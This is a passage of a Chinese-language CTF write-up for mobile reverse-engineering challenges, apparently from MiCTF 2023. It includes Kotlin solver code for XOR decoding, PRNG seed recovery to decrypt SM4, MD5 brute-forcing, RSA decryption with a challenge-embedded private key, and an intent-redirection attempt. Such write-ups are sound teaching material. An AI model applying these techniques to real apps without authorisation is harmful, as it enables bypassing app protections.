xor"]}),"\n",(0,i.jsx)(n.p,{children:"\u5165\u53E3\u6587\u4EF6\uFF0C\u5C06\u4E00\u4E2A20\u4F4D\u7684\u5B57\u7B26\u4E32flag{xxxxxxxxxxxxxx}\u4E2D\u95F4\u90E8\u5206\u6254\u5230\u4E00\u4E2Aso\u6587\u4EF6\u5904\u7406\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"APP\u5165\u53E3",src:W})}),"\n",(0,i.jsx)(n.p,{children:"\u628Aso\u6587\u4EF6\u6254\u5230IDA\u91CC\uFF0C\u6309F5\u53CD\u7F16\u8BD1\u6210\u6E90\u7801\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"IDA\u53CD\u7F16\u8BD1so",src:H})}),"\n",(0,i.jsx)(n.p,{children:"\u5BF9C\u8BED\u8A00\u4E0D\u662F\u5F88\u4E86\u89E3\uFF0C\u5927\u6982\u80FD\u770B\u61C2\uFF0C\u5199\u4E86\u4E2A\u89E3\u7801\u7A0B\u5E8F\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:"package com.sumygg.mictf2023.android_2\n\nfun toLH(n: Int): ByteArray {\n    val b = ByteArray(4)\n    b[0] = (n and 0xff).toByte()\n    b[1] = (n shr 8 and 0xff).toByte()\n    b[2] = (n shr 16 and 0xff).toByte()\n    b[3] = (n shr 24 and 0xff).toByte()\n    return b\n}\n\nfun main() {\n    val str = \"Hello_from_C++\"\n    val num1 = 251658271\n    val num2 = 1073951232\n    val num3 = 387712034\n    val bytes = toLH(num1) + toLH(num2) + toLH(num3) + byteArrayOf('m'.toByte(), '\\n'.toByte())\n    val sb = StringBuilder()\n    for (i in 0 until 14) {\n        sb.append((bytes[i].toInt() xor str[i].toInt()).toChar())\n    }\n    println(\"flag{$sb}\")\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u540E\u4E24\u4F4Dm\u548C\\n\u662F\u731C\u51FA\u6765\u7684\uFF0C\u6709\u6CA1\u6709\u5927\u4F6C\u5E2E\u5FD9\u89E3\u91CA\u4E00\u4E0B\u4E3A\u4EC0\u4E48v8\u4F1A\u8986\u76D6\u5230v7\u7684\u540E\u9762\uFF1F"}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-3-maze",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-3-maze",children:"#"}),"mobile-3 MAZE"]}),"\n",(0,i.jsx)(n.p,{children:"\u60F3\u8D77\u4E86\u4E0A\u4E00\u5C4A\u7684\u9898\u76EE\uFF0C\u4E0D\u8FC7\u8FD9\u6B21\u7528android\u5199\u7684\uFF0C\u5E78\u8FD0\u7684\u662F\u6CA1\u7528so\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u6E90\u7801\u542B\u4E49\u662F\u9898\u76EE\u7ED9\u4E86\u4E00\u4E2A\u5730\u56FE\uFF0C\u8D7024\u6B65\u4ECE@\u8D70\u5230#\u53F7\uFF0Cadsw\u5206\u522B\u4EE3\u8868\u5DE6\u53F3\u4E0B\u4E0A\uFF0C\u6700\u540E\u884C\u8D70\u7684\u8DEF\u5F84\u5C31\u662Fflag\u3002\u62C6\u4E86\u4E00\u4E0B\u4EE3\u7801\uFF0C\u5927\u6982\u80FD\u770B\u51FA\u4E2A\u6837\u5B50\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"maze_map",src:R})}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-4-\u91CD\u5B9A\u5411\u521D\u63A2",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-4-\u91CD\u5B9A\u5411\u521D\u63A2",children:"#"}),"mobile-4 \u91CD\u5B9A\u5411\u521D\u63A2"]}),"\n",(0,i.jsx)(n.p,{children:"\u7406\u8BBA\u4E0A\u81EA\u5DF1\u6784\u9020\u4E00\u4E2Aintent\uFF0C\u7136\u540E\u628Aexp\u7684intent\u6307\u5411flag activity\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"APP onCreate",src:X})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'fun test() {\n    binding.testButton.setOnClickListener {\n        val intent = Intent("ACTION_SHARE_TO_ME")\n        intent.component = ComponentName("com.mictf.intent0", "com.mictf.intent0.MainActivity")\n    \n        val next = Intent()\n        next.setClassName("com.mictf.intent0", "com.mictf.intent0.flag")\n    \n        intent.putExtra("exp", next)\n        startActivity(intent)\n    }\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.del,{children:"\u4F46\u662Faction\u7684\u5224\u65AD\u548Cintent-filter\u91CC\u7684\u503C\u4E0D\u4E00\u6837\uFF0C\u5BFC\u81F4intent\u65E0\u6CD5\u4F20\u8FBE\u3002\u3002\u3002"})}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u7EC8\u731C\u6D4B\u4E86\u4E00\u4E2Aflag\u51FA\u6765\u3002\u3002\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-5-\u6570\u5B66\u5BB6",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-5-\u6570\u5B66\u5BB6",children:"#"}),"mobile-5 \u6570\u5B66\u5BB6"]}),"\n",(0,i.jsx)(n.p,{children:"apk\u53CD\u7F16\u8BD1\u4E00\u4E0B\uFF0C\u53D1\u73B0\u662F\u4E2ASM4\u7B97\u6CD5\u3002\u641C\u7D22\u4E86\u4E00\u4E0B\uFF0C\u6709\u4E2ASM4\u4E2D\u7684DFA\uFF08\u4FA7\u4FE1\u9053\u653B\u51FB\uFF09\u7684\u65B9\u6CD5\u3002\u4F46\u662F\u611F\u89C9\u4E0D\u592A\u5BF9\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u6CE8\u91CA\u91CC\u63D0\u5230\u4E86r1\u548Cr2\u7684\u503C\uFF0C\u8BA9\u4F60\u6C42\u89E3r3\u548Cr4\u3002\u540E\u6765\u7EC8\u4E8E\u660E\u767D\u4E86\u6CE8\u91CA\u91CC\u7684r1\uFF0Cr2\u4EE3\u8868\u7684\u662F\u4EC0\u4E48\u610F\u601D\uFF0C\u8FD9\u56DB\u4E2A\u6570\u5B57\u662F\u968F\u673A\u6570\u751F\u6210\u7684\uFF0C\u6211\u4EEC\u90FD\u77E5\u9053\u8BA1\u7B97\u673A\u751F\u6210\u968F\u673A\u6570\u662F\u4E00\u79CD\u4F2A\u968F\u673A\u6570\uFF0C\u77E5\u9053\u4E86\u79CD\u5B50\u5C31\u80FD\u9884\u6D4B\u4E0B\u6B21\u7684\u751F\u6210\u7ED3\u679C\u3002\u6B63\u597D\u8FD9\u91CC\u77E5\u9053\u4E86\u4E24\u4E2A\u968F\u673A\u6570\uFF0C\u53EF\u4EE5\u904D\u5386\u6C42\u89E3\u4E0B\u6B21\u548C\u4E0B\u4E0B\u6B21\u7684\u968F\u673A\u6570\u79CD\u5B50\u4E86\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'package com.sumygg.mictf2023.android_5\n\nval r1 = 0x5B43251CL\nval r2 = 0x3FE052A6L\n\nfun liner(seed: Long): Long {\n    return ((seed * 25214903917 + 11) and 0xffffffffffff)\n}\n\nfun getNext(v1: Long, v2: Long): Long {\n    for (i in 0..65535) {\n        val seed = (v1 * 65536 + i).toLong()\n        if ((liner(seed) shr 16) == v2) {\n            println("seed ${seed}")\n            return (liner(liner(seed)) shr 16)\n        }\n    }\n    return 0\n}\n\nfun main() {\n    val r3 = getNext(r1, r2)\n    val r4 = getNext(r2, r3)\n    println("${r1},${r2},${r3},${r4}")\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u77E5\u9053\u4E86\u56DB\u4E2A\u968F\u673A\u6570\uFF0C\u4EE3\u5165\u5230SM4\u8FDB\u884C\u89E3\u5BC6\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'fun main() {\n    val nextInt: Int = 0x5B43251C\n    val nextInt2: Int = 0x3FE052A6\n    val nextInt3: Int = 3987903328.toInt()\n    val nextInt4: Int = 1834396842\n//    Log.e("Tips", "r1 = 0x5B43251C")\n//    Log.e("Tips", "r2 = 0x3FE052A6")\n//    Log.e("Tips", "Can you find r3 and r4 ?")\n    val res = Encryption.deal(\n        "64E17A9C1A7A396E479BD78BEE46FBAA",\n        0,\n        Encryption.hexStringToBytes(\n            String.format("%08X", nextInt) + String.format(\n                "%08X",\n                nextInt2\n            ) + String.format("%08X", nextInt3) + String.format("%08X", nextInt4)\n        )\n    )\n    println(res)\n}\n// 736D345F346E645F72406E64306D2121\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5F97\u5230\u7684\u7ED3\u679C\u5341\u516D\u8FDB\u5236\u89E3\u7801\u4E00\u4E0B\u5373\u53EF\u5F97\u5230flag\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-6-\u591A\u5C11\u4E2Amd5",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-6-\u591A\u5C11\u4E2Amd5",children:"#"}),"mobile-6 \u591A\u5C11\u4E2AMD5"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u662Fso\u6587\u4EF6\u7684\u9006\u5411\u5206\u6790\u3002\u9006\u5411\u4E0D\u662F\u5F3A\u9879\uFF0C\u53EA\u80FD\u8FDE\u8499\u5E26\u731C\u7684\u505A\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u628Aapk\u53CD\u7F16\u8BD1\u4E00\u4E0B\uFF0C\u627E\u5230\u5165\u53E3\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-java",meta:"",children:'   private static final void onCreate$lambda$0(Editable var0, MainActivity var1, View var2) {\n      Intrinsics.checkNotNullParameter(var1, "this$0");\n      if (StringsKt.startsWith$default(var0.toString(), "flag{", false, 2, (Object)null) && StringsKt.endsWith$default(var0.toString(), "}", false, 2, (Object)null) && var0.length() == 25) {\n         String var3 = var0.toString().substring(5, var0.length() - 1);\n         Intrinsics.checkNotNullExpressionValue(var3, "this as java.lang.String\u2026ing(startIndex, endIndex)");\n         if (var1.stringFromJNI(var3)) {\n            Toast.makeText((Context)var1, (CharSequence)"flag\u6B63\u786E\uFF01", 0).show();\n         } else {\n            Toast.makeText((Context)var1, (CharSequence)"flag\u9519\u8BEF\uFF01", 0).show();\n         }\n      } else {\n         Toast.makeText((Context)var1, (CharSequence)"flag\u683C\u5F0F\u9519\u8BEF\uFF01", 0).show();\n      }\n\n   }\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u6BB5\u4EE3\u7801\u5224\u65AD\u8F93\u5165\u5B57\u7B26\u4E32\u7684\u683C\u5F0F\u4E3Aflag{xxxxxxxx}\uFF0C\u957F\u5EA625\u4F4D\uFF0C\u5E76\u5C06\u5176\u4E2D\u768419\u4F4D\u4F20\u4E2Aso\u6587\u4EF6\u8FDB\u884C\u5224\u65AD\u3002\u91CD\u70B9\u770B\u4E00\u4E0Bso\u6587\u4EF6\u7684\u51FD\u6570\u7684\u903B\u8F91\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u628Aso\u6587\u4EF6\u6254IDA pro\u91CC\uFF0C\u627E\u5230\u5165\u53E3 ",(0,i.jsx)(n.code,{children:"Java_com_crl_native1_MainActivity_stringFromJNI"})," \uFF0C\u5927\u4F53\u770B\u4E00\u4E0B\u7A0B\u5E8F\u7ED3\u6784\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u5F00\u59CB\u58F0\u660E\u4E864\u4E2A\u5B57\u7B26\u4E32\uFF0C\u770B\u6837\u5B50\u662FMD5\u3002\u901A\u8FC7\u5728\u7EBFmd5\u53CD\u67E5\u53EF\u4EE5\u628A\u524D\u4E09\u4E2A\u89E3\u51FA\u6765\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"md5",src:G})}),"\n",(0,i.jsx)(n.p,{children:"\u524D\u4E09\u4E2A\u6BCF\u4E2A\u90FD\u662F\u4E00\u4E2A4\u4F4D\u7684\u5B57\u7B26\u4E32\uFF0C\u731C\u6D4B\u4E00\u4E0B\u6700\u540E\u4E00\u4E2A\u4E5F\u662F\u4E00\u4E2A4\u4F4D\u7684\u5B57\u7B26\u4E32\u751F\u6210\u7684\u3002\u4F46\u662F\u5728\u7EBFmd5\u89E3\u4E0D\u51FA\u6765\u3002\u7EE7\u7EED\u770B\u540E\u9762\u7684\u903B\u8F91\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u8BA1\u7B97\u903B\u8F91",src:$})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E00\u90E8\u5206\u5BF9\u5B57\u7B26\u4E32\u6BCF4\u4F4D\u6C42\u4E00\u6B21md5\uFF0C\u4E0E\u4E0A\u9762\u7684md5\u8FDB\u884C\u6BD4\u8F83\u3002\u6700\u540E4\u4F4D\u8FDE\u7EED\u6C42\u4E86\u4E24\u6B21md5\uFF0C\u6240\u4EE5\u624D\u67E5\u4E0D\u51FA\u6765\u3002\u5199\u4E2A\u7A0B\u5E8F\u7206\u7834\u4E00\u4E0B\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'package com.sumygg.mictf2023.android_4\n\nimport org.apache.commons.codec.digest.DigestUtils\n\nfun md5(str: String): String {\n    return DigestUtils.md5Hex(str)\n}\n\nval md5str = "95bc7a9681dc650bb0531110bdcbd65d"\n\nfun crack() {\n    val str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ?.,|\\\\/~!@#$%^&*()-_=+?{}[]` ;:\'\\""\n    for (ch1 in str) {\n        for (ch2 in str) {\n            for (ch3 in str) {\n                for (ch4 in str) {\n                    val x = ch1.toString() + ch2 + ch3 + ch4\n                    if (md5(md5(x)) == md5str) {\n                        println(x)\n                        return\n                    }\n                }\n            }\n        }\n    }\n    println("notfound")\n}\n\nfun main() {\n    println(md5("xiao"))\n    println(md5("mi1I"))\n    println(md5("2023"))\n    println(md5(md5("ctf!")))\n//    crack()\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u7EC8\u628A\u6240\u6709md5\u7684\u539F\u503C\u627E\u51FA\u6765\u4E4B\u540E\uFF0C\u62FC\u63A5\u6210\u5B57\u7B26\u4E32\uFF0C\u63D0\u4EA4\uFF0C\u5C45\u7136\u4E0D\u5BF9\u3002\u3002\u3002\u96BE\u9053\u6F0F\u6389\u4E86\u4EC0\u4E48\uFF1F\uFF1F\uFF1F"}),"\n",(0,i.jsx)(n.p,{children:"======================\u5361\u4E86\u597D\u4E45\u7684\u5206\u5272\u7EBF====================="}),"\n",(0,i.jsx)(n.p,{children:"\u53C8\u4ED4\u7EC6\u770B\u4E86\u4E00\u4E0B\uFF0C\u5165\u53C2\u662F19\u4F4D\u5B57\u7B26\u4E32\uFF0C\u800C\u73B0\u5728\u53EA\u670916\u4F4D\uFF0C\u8FD8\u6709\u4E09\u4F4D\u88AB\u5904\u7406\u6CA1\u4E86\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u9057\u6F0F\u7684\u903B\u8F91",src:U})}),"\n",(0,i.jsx)(n.p,{children:"\u770B\u8FD9\u91CC\uFF0Cgetline\u662F\u8BFB\u5165\u4E00\u4E2A\u5B57\u7B26\u4E32\uFF0C45\u662F\u6307\u5B9A\u7684\u5206\u9694\u7B26\uFF0C\u6362\u7B97\u6210ascii\u5C31\u662F\u51CF\u53F7-\u3002\u6240\u4EE5\u731C\u6D4B4\u6BB5md5\u4E2D\u95F4\u8FD8\u6709\u4E09\u4E2A\u51CF\u53F7\uFF0C\u6B63\u597D\u7EC4\u621019\u4F4D\u3002\u63D0\u4EA4\uFF0C\u6B63\u786E\uFF01"}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-7-pdd",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-7-pdd",children:"#"}),"mobile-7 pdd"]}),"\n",(0,i.jsx)(n.p,{children:"apk\u6254\u5230\u53CD\u7F16\u8BD1\u5DE5\u5177\u91CC\u770B\u4E00\u4E0B\uFF0C\u53D1\u73B0\u5728ValActivity.class\u91CC\u6709\u4E00\u4E2A\u89E3\u5BC6\u7A0B\u5E8F\uFF0C\u901A\u8FC7intent\u63A5\u6536\u4E00\u4E2Aprivatekey\uFF0C\u7136\u540E\u5BF9\u786C\u7F16\u7801\u7684\u5B57\u7B26\u4E32\u8FDB\u884C\u89E3\u5BC6\u3002\u89E3\u5BC6\u903B\u8F91\u90FD\u5728Util.class\u91CC\uFF0C\u800C\u4E14privatekey\u653E\u5728\u4E86res/raw\u76EE\u5F55\u4E0B\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u6839\u636E\u89E3\u5BC6\u903B\u8F91\u5199\u4E00\u6BB5\u89E3\u5BC6\u4EE3\u7801\uFF1A"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'package com.sumygg.mictf2023.android_7\n\nimport org.apache.commons.codec.binary.Base64\nimport java.nio.charset.StandardCharsets\nimport java.security.KeyFactory\nimport java.security.PrivateKey\nimport java.security.spec.PKCS8EncodedKeySpec\nimport javax.crypto.Cipher\n\nfun getPrivateKeyFromString(str: String): PrivateKey {\n    val var1 = PKCS8EncodedKeySpec(Base64.decodeBase64(str))\n    return KeyFactory.getInstance("RSA").generatePrivate(var1)\n}\n\n\nfun decrypt(s: String, key: PrivateKey): String {\n    val instance = Cipher.getInstance("RSA/ECB/PKCS1Padding")\n    instance.init(2, key)\n    return String(instance.doFinal(Base64.decodeBase64(s)), StandardCharsets.UTF_8)\n}\n\nval privateKeyStr =\n    "MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAhwgY3ay6Ty0W6nUt\\n" +\n            "yqhiUV4+5/KFwiY3U1YkkAdXwMuB9T367zDkjVEF5bnB2swDt5/O0P08xArhzQ0p\\n" +\n            "WDoK/QIDAQABAkARKGq8dC/CUsjoJtaYOzgu/apBn9P2PRPnn3kK4hv479G40An/\\n" +\n            "emfHM4mN1cQT+PD9Eswg+JjohdIxPlH/kQLxAiEAip0SFC1CrqzW35UhlFxdbxNT\\n" +\n            "DSN10TgPj8tVn84CIrUCIQD5Ynos1RHwiT0HFdpZ/CIojd13TkzYiYPt1V81nnoM\\n" +\n            "KQIgIspTnE7T2sW01L84g2U/aj6ebMDGtHFurnepkQeCz7UCIQDWO1WvK77EfnCx\\n" +\n            "pIE16hXB9tS4h8gWAFQYPMMUgbZguQIgN3eGtyJasra6VIg/huHLBRjU3shYh9TN\\n" +\n            "WOfeyRzQeyw="\nval text = "X2l9IVSbjYDgVQ2dLoIZWo55cGUT4Mgx2tJuDjZwi5E+e8kZ28iNINOJdXv9NtVXBiY+ow9kpRtEFbuE3oJr6g=="\nfun main() {\n    println(decrypt(text, getPrivateKeyFromString(privateKeyStr)))\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u5BC6\u94A5\u4E0Eapk\u91CC\u7684privatekey.pdd\u4E0D\u4E00\u6837\uFF0C\u76F4\u63A5\u4F7F\u7528\u4F1A\u62A5",(0,i.jsx)(n.code,{children:"algid parse error, not a sequence"}),"\u7684\u9519\u8BEF\u3002\u9700\u8981\u8F6C\u4E00\u4E0B\u683C\u5F0F"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"key.txt\n\n-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJBAIcIGN2suk8tFup1LcqoYlFePufyhcImN1NWJJAHV8DLgfU9+u8w5I1RBeW5wdrMA7efztD9PMQK4c0NKVg6Cv0CAwEAAQJAEShqvHQvwlLI6CbWmDs4Lv2qQZ/T9j0T5595CuIb+O/RuNAJ/3pnxzOJjdXEE/jw/RLMIPiY6IXSMT5R/5EC8QIhAIqdEhQtQq6s1t+VIZRcXW8TUw0jddE4D4/LVZ/OAiK1AiEA+WJ6LNUR8Ik9BxXaWfwiKI3dd05M2ImD7dVfNZ56DCkCICLKU5xO09rFtNS/OINlP2o+nmzAxrRxbq53qZEHgs+1AiEA1jtVryu+xH5wsaSBNeoVwfbUuIfIFgBUGDzDFIG2YLkCIDd3hrciWrK2ulSIP4bhywUY1N7IWIfUzVjn3skc0Hss\n-----END RSA PRIVATE KEY-----\n\nopenssl pkcs8 -topk8 -inform pem -in key.txt -outform pem -nocrypt -out privatekey_p8.key\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u6837\u89E3\u5BC6\u51FA\u6765\u7684\u4E4B\u540E\u540E\u534A\u6BB5\u5BC6\u94A5\uFF0C\u524D\u534A\u6BB5\u5728\u54EA\u513F\uFF1F"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u5341\u516D\u8FDB\u5236\u67E5\u770B",src:V})}),"\n",(0,i.jsx)(n.p,{children:"\u5C31\u5728apk\u91CC\uFF0C\u4E0D\u77E5\u9053\u88AB\u85CF\u54EA\u91CC\u4E86\u3002\u3002\u3002\u6709\u6CA1\u6709\u5927\u4F6C\u5E2E\u5FD9\u6307\u8BA4\u4E00\u4E0B\u3002\u3002\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-9-bqq",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-9-bqq",children:"#"}),"mobile-9 bqq"]}),"\n",(0,i.jsx)(n.p,{children:"\u7167\u4F8B\u53CD\u7F16\u8BD1apk\u6587\u4EF6\u3002\u53D1\u73B0java\u4EE3\u7801\u8C03\u7528\u4E86so\u6587\u4EF6\u7684flag\u548Cdddd\u51FD\u6570\uFF0C\u5176\u5B83\u7684\u903B\u8F91\u6CA1\u4E86\u3002\u91CD\u70B9\u770B\u4E00\u4E0Bso\u6587\u4EF6\u91CC\u7684\u903B\u8F91\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u53CD\u7F16\u8BD1so",src:K})}),"\n",(0,i.jsxs)(n.p,{children:["flag\u51FD\u6570\u662F\u4E00\u4E2A\u7F16\u7801\u7B97\u6CD5\uFF0C\u5148\u5C06\u8F93\u5165\u5B57\u7B26\u4E32\u4E0E",(0,i.jsx)(n.code,{children:"dlddddhm"}),"\u8FDB\u884C\u5F02\u6216\uFF0C\u7136\u540E\u5C06\u5F02\u6216\u7684\u7ED3\u679C\u8F6C\u6210hex\u5B57\u7B26\u4E32\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"dddd\u51FD\u6570\u662F\u4E00\u4E9B\u8BF7\u6C42\u8FDC\u7A0B\u670D\u52A1\u7684\u51FD\u6570\uFF0C\u5927\u4F53\u5C31\u662F\u901A\u8FC7socket\u4E0E\u8FDC\u7A0B\u670D\u52A1\u8FDE\u63A5\uFF0C\u7136\u540E\u62FC\u63A5HTTP header\u53D1\u9001\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5C06\u8FD9\u4E24\u90E8\u5206\u903B\u8F91\u63D0\u53D6\u51FA\u6765\uFF0C\u5199\u4E86\u4E00\u4E2A\u7A0B\u5E8F\u3002\u7136\u540E\u518D\u770B\u4E00\u4E0B\u8FDC\u7A0B\u670D\u52A1\uFF0C\u662F\u4E00\u4E2A\u7F51\u9875\uFF0C\u63D0\u793Agive me the trueflag."}),"\n",(0,i.jsx)(n.p,{children:"\u81F3\u6B64\u867D\u7136\u5168\u90E8\u7684\u65B9\u6CD5\u90FD\u4E86\u89E3\u4E86\uFF0C\u4F46\u662F\u7ED9\u8FDC\u7A0B\u670D\u52A1\u53D1\u4EC0\u4E48\u90FD\u8FD8\u6CA1\u6709\u601D\u8DEF\u3002"}),"\n",(0,i.jsx)(n.p,{children:"========================\u5361\u4E86\u5F88\u4E45\u7684\u5206\u5272\u7EBF===================="}),"\n",(0,i.jsx)(n.p,{children:"\u7ED9\u4E86hint\u8BF4\u6CE8\u610FReferer\uFF0C\u6211\u53C8\u91CD\u70B9\u770B\u4E86\u4E00\u4E0B\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"Referer:https://www.baidu.com/?wd=020D0F010208090A\\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u91CC\u9762wd\u540E\u9762\u7684\u5B57\u7B26\u4E32\u5F88\u50CFflag\u51FD\u6570\u52A0\u5BC6\u7684\u7ED3\u679C\uFF0C\u5199\u4E2A\u7A0B\u5E8F\u89E3\u5BC6\u4E00\u4E0B\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'fun decode(str: String): String {\n    val sb = StringBuilder()\n    for (i in 0 until str.length / 2) {\n        val x = str2.indexOf(str[i * 2]) * 16 + str2.indexOf(str[i * 2 + 1])\n        sb.append(Char(x xor str1[i].code))\n    }\n    return sb.toString()\n}\n\n// println(decode("020D0F010208090A"))\n// fakeflag\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u7ED3\u679C\u662Ffakeflag\uFF0C\u610F\u601D\u662F\u53D1\u9001trueflag\u8FC7\u53BB\u5417\uFF1F"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'fun encode(): String {\n    val input = "trueflag"\n    val inputLen = input.length\n    val output = CharArray(inputLen + 1)\n    if (inputLen > 0) {\n        var x = 0\n        var y = 0\n        while (x != inputLen) {\n            val ch = str1[y]\n            y = y - ((y + (((y + 1) shr 31) shr 29) + 1) and 0xFFFFFF8) + 1\n            output[x] = (input[x].code xor ch.code).toChar()\n            x++\n        }\n    }\n    output[inputLen] = 0.toChar()\n    val output2 = CharArray(2 * inputLen + 1)\n    if (inputLen > 0) {\n        for (i in 0 until inputLen) {\n            val tmp = output[i].code % 16\n            output2[2 * i] = str2[output[i].code / 16]\n            output2[2 * i + 1] = str2[tmp]\n        }\n    }\n    output2[2 * inputLen] = 0.toChar()\n    println(output2.joinToString(""))\n}\n\n// 101E11010208090A\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u6784\u9020\u8BF7\u6C42\uFF0C\u53D1\u9001\uFF0C\u6210\u529F\u8FD4\u56DEflag"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u6784\u9020\u8BF7\u6C42",src:Z})}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-10-vm",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-10-vm",children:"#"}),"mobile-10 VM"]}),"\n",(0,i.jsx)(n.p,{children:"\u53CD\u7F16\u8BD1\u770B\u4E00\u4E0B\uFF0C\u7528java\u5199\u4E86\u4E00\u4E2A\u7B80\u5355\u7684\u865A\u62DF\u673A\u6765\u6267\u884C\u4EE3\u7801\uFF0C\u6307\u4EE4\u96C6\u4E5F\u6BD4\u8F83\u5C11\u3002\u5C06\u4EE3\u7801\u63D0\u53D6\u51FA\u6765\u8F6C\u6210\u4E86kotlin\u8BED\u8A00\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'package com.sumygg.mictf2023.android_10\n\n// @formatter:off\nval opcode = intArrayOf(\n 3, 0, 0, 0, 0, 0,\n 3, 0, 0, 0, 0, 1,\n 3, 0, 0, 0, 0, 2,\n 3, 23, 0, 0, 0, 3,\n 3, 3, 0, 0, 0, 4,\n 3, 87, 4, 0, 0, 5,\n 3, 127, 0, 0, 0, 6,\n 3, /* a2 */ 25, 0, 0, 0, 7,\n\n 2, 2, 0,\n 9, 2,\n 1, 3, 1,\n 6, 4, 1,\n 4, 5, 1,\n 8, 6, 1,\n 1, 1, 3,\n 10, 0, 1,\n 11, 10, // jump -> a1\n 10, 2, 7,\n 11, 222, // jump -> a2\n 12,\n 0,\n 0,\n 0, // a1\n)\n// @formatter:on\n\nvar tag = false\nval dest =\n    intArrayOf(37, 79, 78, 75, 66, 39, 85, 96, 2, 101, 17, 19, 25, 43, 97, 5, 110, 44, 100, 14, 10, 125, 89, 108, 38)\nval checkDest = ArrayList<Int>()\nfun vm() {\n    val register = IntArray(8)\n    var pos = 0\n    var isRunning = true\n    var tmp1 = 0\n    while (isRunning) {\n        var tmp2: Int\n        when (opcode[pos]) {\n            // \u505C\u673A\u6307\u4EE4\n            0 -> isRunning = false\n            // op a b \u5C06\u5BC4\u5B58\u5668a\u7684\u503C\u8D4B\u503C\u7ED9\u5BC4\u5B58\u5668b b = a\n            1 -> {\n                register[opcode[pos + 2]] = register[opcode[pos + 1]]\n                pos += 2\n            }\n\n            // op a b \u5C06\u5BC4\u5B58\u5668a\u6307\u5411\u7684\u6570\u636E\u52A0\u8F7D\u5230\u5BC4\u5B58\u5668b b = load(a)\n            2 -> {\n                register[opcode[pos + 2]] = dest[register[opcode[pos + 1]]]\n                pos += 2\n            }\n\n            // op x1 x2 x3 x4 e \u5C06\u5E38\u91CF x4x3x2x1 \u52A0\u8F7D\u5230\u5BC4\u5B58\u5668e e = x\n            3 -> {\n                register[opcode[pos + 5]] =\n                    opcode[pos + 1] + (opcode[pos + 2] shl 8) + (opcode[pos + 3] shl 16) + 